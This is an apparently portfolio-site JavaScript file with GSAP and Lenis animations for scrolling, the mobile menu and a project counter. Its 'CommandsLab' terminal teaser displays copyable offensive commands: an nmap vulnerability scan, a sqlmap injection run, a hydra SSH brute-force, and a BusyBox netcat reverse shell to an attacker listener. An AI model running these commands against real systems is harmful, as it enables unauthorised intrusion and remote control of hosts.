document.addEventListener('DOMContentLoaded', function () {

    gsap.registerPlugin(SplitText, ScrollTrigger, ScrollToPlugin);

    // 1. Lenis Smooth Scroll Setup with optimal inertia
    const lenis = new Lenis({
        lerp: 0.08,
        smoothWheel: true,
        wheelMultiplier: 1.0,
        touchMultiplier: 1.5,
    });

    // Synchronize Lenis scrolling with GSAP's ScrollTrigger plugin
    lenis.on('scroll', (e) => {
        ScrollTrigger.update();
        updateProgressBar(e);
    });

    // Add Lenis's requestAnimationFrame method to GSAP's ticker for zero-jitter sync
    gsap.ticker.add((time) => {
        lenis.raf(time * 1000);
    });

    // 2. Framer-Inspired Scroll Progress Bar
    const progressBar = document.getElementById('scrollProgressBar');
    function updateProgressBar(e) {
        if (!progressBar) return;
        const scrollProgress = e.progress !== undefined 
            ? e.progress * 100 
            : (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
        progressBar.style.width = `${Math.min(100, Math.max(0, scrollProgress))}%`;
    }

    // Dynamic Copyright Year
    document.querySelectorAll(".current-year").forEach(el => {
        el.textContent = new Date().getFullYear();
    });

    // 3. Preloader & Initial Intro Animation
    document.fonts.ready.then(() => {
        const tl = gsap.timeline();

        // Split text
        const split1 = new SplitText('.Intro-heading h5', { type: 'words', mask: "words" });
        const split2 = new SplitText('.topHeading h5', { type: 'words', mask: "words" });
        const split3 = new SplitText('.loaderAnimation1 h5, .loaderAnimation1 p', { type: 'words', mask: "words" });
        const split4 = new SplitText('.top-heading span', { type: 'chars', mask: "chars" });
        const split5 = new SplitText(".intro-text p", { type: "lines", mask: "lines", autoSplit: true });
        const split6 = new SplitText(".work-status p", { type: "lines", mask: "lines", autoSplit: true });
        const split7 = new SplitText(".joined_year span", { type: "lines", mask: "lines", autoSplit: true });
        const split8 = new SplitText(".mobile-top-heading h1 span", { type: "words", mask: "words" });

        // Initial state
        gsap.set(split1.words, { x: 300, y: 0, autoAlpha: 0 });

        // Intro text in
        tl.to(split1.words, {
            x: 0,
            autoAlpha: 1,
            duration: 1.8,
            stagger: 0.12,
            ease: 'Power3.easeInOut'
        });

        // Move all text up
        tl.to([split1.words, split2.words, split3.words], {
            y: -100,
            duration: 1.0,
            delay: 0.4,
            ease: 'Power3.easeInOut'
        }, "-=0.4");

        // Collapse loader curtain upward
        tl.to('.loader1', {
            transformOrigin: 'top',
            scaleY: 0,
            duration: 1.1,
            ease: "Power3.easeInOut",
            onComplete: () => {
                const loaderEl = document.querySelector(".loader1");
                if (loaderEl) loaderEl.style.display = "none";
                document.body.classList.remove('loader-active');
            }
        });

        // Reveal main heading
        tl.from([split4.chars, split8.words], {
            y: 80,
            duration: 1,
            opacity: 0,
            stagger: 0.05,
            ease: "power3.out"
        }, "-=0.8");

        tl.from([split5.lines, split6.lines], {
            y: 35,
            opacity: 0,
            duration: 1,
            stagger: 0.07,
            ease: "power3.out"
        }, "-=0.6");

        tl.from(".arrow-icon", {
            y: 20,
            opacity: 0,
            duration: 0.8,
            ease: "power2.out"
        }, "-=0.8");

        tl.from(split7.lines, {
            y: 20,
            duration: 0.9,
            opacity: 0,
            stagger: 0.06,
            ease: "power2.out"
        }, "-=0.8");

        tl.from(".button-clip-wrapper button, .button-clip-wrapper a:not(:has(button))", {
            y: 15,
            opacity: 0,
            duration: 0.6,
            stagger: 0.1,
            ease: "back.out(1.8)",
        }, "-=0.7");
    });

    // 4. Hero Section Pin & Fade Animation
    gsap.to("#page1", {
        y: 40,
        opacity: 0,
        scrollTrigger: {
            trigger: "#page1",
            start: "top top",
            end: "bottom top",
            scrub: true,
            pin: true,
            pinSpacing: false,
            anticipatePin: 1,
            invalidateOnRefresh: true,
        }
    });

    // 4.1 Kinetic Ribbon Scroll Parallax (Left/Right alternating smooth scroll)
    const ribbonSection = document.querySelector(".ribbon-scroll-section");
    if (ribbonSection) {
        gsap.to(".ribbon-row-left", {
            x: -120,
            ease: "none",
            scrollTrigger: {
                trigger: ribbonSection,
                start: "top bottom",
                end: "bottom top",
                scrub: 1.2,
                invalidateOnRefresh: true,
            }
        });

        gsap.to(".ribbon-row-right", {
            x: 120,
            ease: "none",
            scrollTrigger: {
                trigger: ribbonSection,
                start: "top bottom",
                end: "bottom top",
                scrub: 1.2,
                invalidateOnRefresh: true,
            }
        });
    }

    // 5. Mobile Navigation Menu Animations
    const hamburger = document.querySelector(".hamburger");
    const navBox = document.querySelector(".mobile-nav-box");
    const navItems = document.querySelectorAll(".mobile-nav-list .item");
    const contactItems = document.querySelectorAll(".contact-details-list div, .contact-details-list p, .contact-details-list a");
    const line1 = document.querySelector(".line1");
    const line2 = document.querySelector(".line2");

    gsap.set(navBox, { x: '100%' });

    // Smooth Anchor Scrolling with Lenis integration
    document.querySelectorAll('.nav-links').forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute("href");
            if (href && href.startsWith("#")) {
                e.preventDefault();
                const targetElement = document.querySelector(href);
                if (targetElement) {
                    lenis.scrollTo(targetElement, {
                        offset: -50,
                        duration: 1.2,
                        easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t))
                    });
                }
            }
        });
    });

    const tl0 = gsap.timeline({
        paused: true,
        reversed: true,
        onReverseComplete: () => {
            if (line1 && line2) {
                line1.classList.remove("rotate-45", "translate-y-[4px]");
                line2.classList.remove("-rotate-45", "translate-y-[-2px]");
            }
        }
    });

    tl0.to(navBox, {
        x: 0,
        duration: 0.8,
        ease: "power4.out"
    })
    .from(navItems, {
        y: 40,
        opacity: 0,
        stagger: 0.1,
        duration: 0.6,
        ease: "power3.out"
    }, "-=0.4")
    .from(contactItems, {
        y: 20,
        opacity: 0,
        duration: 0.5,
        ease: "power2.out",
        stagger: 0.08
    }, "-=0.3");

    if (hamburger) {
        hamburger.addEventListener("click", () => {
            if (gsap.isTweening(navBox)) return;

            if (tl0.reversed()) {
                tl0.play();
                if (line1 && line2) {
                    line1.classList.add("rotate-45", "translate-y-[4px]");
                    line2.classList.add("-rotate-45", "translate-y-[-2px]");
                }
            } else {
                tl0.reverse();
            }
        });
    }

    // Mobile nav link click handling
    document.querySelectorAll('.mobile-nav-list .item a').forEach(link => {
        link.addEventListener('click', (e) => {
            const targetID = link.getAttribute("href");
            if (targetID && targetID.startsWith("#") && document.querySelector(targetID)) {
                e.preventDefault();
                lenis.scrollTo(targetID, {
                    offset: -40,
                    duration: 1.2
                });
            }

            if (!tl0.reversed()) {
                tl0.reverse();
            }
        });
    });

    // 6. SplitText Scroll Animation Factory
    function AnimateSplitTextScroll({
        elem,
        triggerElem,
        type = "words",
        start = "top 75%",
        end = "bottom top",
        once = true,
        duration = 1,
        ease = "expo.out",
        yPercent = 100,
        opacity = 0,
        stagger = 0.08
    }) {
        if (!gsap || !ScrollTrigger || !SplitText) return;

        document.fonts.ready.then(() => {
            const targets = document.querySelectorAll(elem);
            if (!targets || targets.length === 0) return;

            const split = SplitText.create(elem, {
                type,
                autoSplit: true,
            });

            gsap.from(split[type], {
                yPercent,
                opacity,
                duration,
                ease,
                stagger,
                scrollTrigger: {
                    trigger: triggerElem,
                    start,
                    end,
                    once,
                },
            });
        });
    }

    // Section Typography Animations
    AnimateSplitTextScroll({
        elem: ".animateHeadingPg2 h2",
        type: "words",
        start: "top 75%",
        triggerElem: ".animateHeadingPg2"
    });

    AnimateSplitTextScroll({
        elem: ".serviText2 p",
        type: "lines",
        start: "top 75%",
        triggerElem: ".serviText2"
    });

    AnimateSplitTextScroll({
        elem: ".animateHeadingPg3 p",
        type: "words",
        start: "top 60%",
        triggerElem: ".works"
    });

    AnimateSplitTextScroll({
        elem: ".ProjectText2 p",
        type: "lines",
        start: "top 65%",
        triggerElem: ".ProjectText2"
    });

    AnimateSplitTextScroll({
        elem: ".animateHeadingWorkflow h2",
        type: "words",
        start: "top 95%",
        triggerElem: ".animateHeadingWorkflow"
    });

    AnimateSplitTextScroll({
        elem: ".about-heading div h2",
        type: "words",
        start: "top 60%",
        triggerElem: ".about-heading"
    });

    AnimateSplitTextScroll({
        elem: ".aboutChildDesciption p",
        type: "lines",
        start: "top 65%",
        triggerElem: ".aboutChild3"
    });

    AnimateSplitTextScroll({
        elem: ".aboutChildDesciption2 p",
        type: "lines",
        start: "top 65%",
        triggerElem: ".aboutChild4"
    });

    // 7. Stacking Cards Pinning Setup (Services)
    function setupPins(pinConfigs) {
        pinConfigs.forEach(({ selector, start, end, pinSpacing }) => {
            const el = document.querySelector(selector);
            if (!el) return;
            gsap.to(selector, {
                scrollTrigger: {
                    trigger: selector,
                    id: `pin-${selector.replace('.', '')}`,
                    start,
                    end,
                    endTrigger: ".box3",
                    pin: true,
                    pinSpacing,
                },
                duration: 1,
                ease: "power3.out",
            });
        });
    }

    setupPins([
        { selector: ".box1", start: "top 50px", end: "10% 20%", pinSpacing: false },
        { selector: ".box2", start: "top 150px", end: "10% 20%", pinSpacing: false },
        { selector: ".box3", start: "top 250px", end: "10% 20%", pinSpacing: true },
    ]);

    // 8. Project Cards: Clean editorial cards with direct action buttons (no magnetic image wrapper)

    // 9. Sticky Number Counter for 5 Projects
    const slides = gsap.utils.toArray(".project-detail");
    const numberAnimated = document.querySelector(".number-animated");
    let currentY = 0;
    let targetY = 0;
    const setY = numberAnimated ? gsap.quickSetter(numberAnimated, "yPercent") : null;

    const totalProjects = slides.length || 5;

    const createScrollTrigger = ({ start, end, pinSpacing }) => {
        ScrollTrigger.create({
            trigger: ".Project",
            scrub: 0.2,
            pin: ".number-counter",
            anticipatePin: 1,
            start,
            end,
            pinSpacing,
        });
    };

    slides.forEach((slide, index) => {
        ScrollTrigger.create({
            trigger: slide,
            start: "top 35%",
            end: "bottom 65%",
            onEnter: () => setTarget(index),
            onEnterBack: () => setTarget(index),
        });
    });

    // Each slide step moves by 1 span out of totalProjects spans (e.g. -20% per slide for 5 slides)
    function setTarget(index) {
        targetY = - (100 / totalProjects) * index;
    }

    // LERP Ticker for smooth counter inertia
    if (setY) {
        gsap.ticker.add(() => {
            currentY += (targetY - currentY) * 0.12;
            setY(currentY);
        });
    }

    // Responsive Breakpoints Calibration for Project Pinning
    ScrollTrigger.matchMedia({
        "(max-width: 767px)": function () {
            createScrollTrigger({
                start: "top top",
                end: "bottom 60%",
                pinSpacing: false,
            });
        },
        "(min-width: 768px) and (max-width: 1023px)": function () {
            createScrollTrigger({
                start: "top top",
                end: "bottom 50%",
                pinSpacing: false,
            });
        },
        "(min-width: 1024px)": function () {
            createScrollTrigger({
                start: "top top",
                end: "bottom 45%",
                pinSpacing: false,
            });
        }
    });

    // 10. CommandsLab Interactive Terminal Teaser
    const terminalCommands = {
        nmap: {
            cmd: "nmap -sV -sC -A -p- -T4 --script=vuln 192.168.1.100",
            desc: "// Full aggressive TCP port scan, OS detection, version detection, default scripts & vulnerability auditing."
        },
        sqlmap: {
            cmd: 'sqlmap -u "https://target.com/item?id=1" --dbs --batch --random-agent --level=3',
            desc: "// Automatically test GET parameter for SQL injection, enumerate back-end databases with randomized user-agents."
        },
        hydra: {
            cmd: "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4 -V",
            desc: "// High-speed parallel dictionary brute-force attack against target SSH service using rockyou wordlist."
        },
        shell: {
            cmd: "busybox nc 10.10.14.5 4444 -e /bin/sh",
            desc: "// Lightweight BusyBox reverse shell connecting back to attacker listener on port 4444."
        }
    };

    const terminalTabs = document.querySelectorAll(".terminal-tab");
    const terminalOutput = document.getElementById("terminalOutput");
    const terminalExplanation = document.getElementById("terminalExplanation");
    const copyCommandBtn = document.getElementById("copyCommandBtn");
    const copyBtnText = document.getElementById("copyBtnText");

    terminalTabs.forEach(tab => {
        tab.addEventListener("click", () => {
            const toolKey = tab.getAttribute("data-tool");
            if (!terminalCommands[toolKey]) return;

            terminalTabs.forEach(t => {
                t.classList.remove("active", "bg-[#393632]", "text-[#e8e8e3]");
                t.classList.add("bg-[#1a1a1a]", "text-[#a29e9a]");
            });

            tab.classList.add("active", "bg-[#393632]", "text-[#e8e8e3]");
            tab.classList.remove("bg-[#1a1a1a]", "text-[#a29e9a]");

            if (terminalOutput && terminalExplanation) {
                gsap.to([terminalOutput, terminalExplanation], {
                    opacity: 0,
                    duration: 0.15,
                    onComplete: () => {
                        terminalOutput.textContent = terminalCommands[toolKey].cmd;
                        terminalExplanation.textContent = terminalCommands[toolKey].desc;
                        gsap.to([terminalOutput, terminalExplanation], {
                            opacity: 1,
                            duration: 0.2
                        });
                    }
                });
            }
        });
    });

    if (copyCommandBtn && terminalOutput) {
        copyCommandBtn.addEventListener("click", () => {
            const textToCopy = terminalOutput.textContent.trim();
            navigator.clipboard.writeText(textToCopy).then(() => {
                if (copyBtnText) copyBtnText.textContent = "Copied!";
                copyCommandBtn.classList.add("bg-[#27c93f]");

                setTimeout(() => {
                    if (copyBtnText) copyBtnText.textContent = "Copy Command";
                    copyCommandBtn.classList.remove("bg-[#27c93f]");
                }, 2000);
            }).catch(() => {
                if (copyBtnText) copyBtnText.textContent = "Failed";
            });
        });
    }

    // 11. About Section Subtle Parallax Lift
    gsap.to(".aboutme", {
        y: -40,
        scale: 0.99,
        duration: 0.8,
        ease: "power3.out",
        scrollTrigger: {
            trigger: ".aboutme",
            start: "bottom 85%",
            end: "bottom 70%",
            scrub: 1,
        }
    });

    // 12. Footer Parallax Arrival
    gsap.fromTo(".footer1",
        { y: -60, opacity: 0.8 },
        {
            y: 0,
            opacity: 1,
            duration: 1.5,
            ease: "power3.out",
            scrollTrigger: {
                trigger: ".footer1",
                start: "top 85%",
                end: "bottom 95%",
                scrub: 1,
            },
        }
    );

    // 13. Workflow Cards Hover/Scroll Stagger
    /* gsap.from(".workflow-card", {
        y: 40,
        opacity: 1,
        stagger: 0.12,
        duration: 0.8,
        ease: "power2.out",
        scrollTrigger: {
            trigger: "#workflow",
            start: "top 95%",
            once: true,
        }
    }); */

});
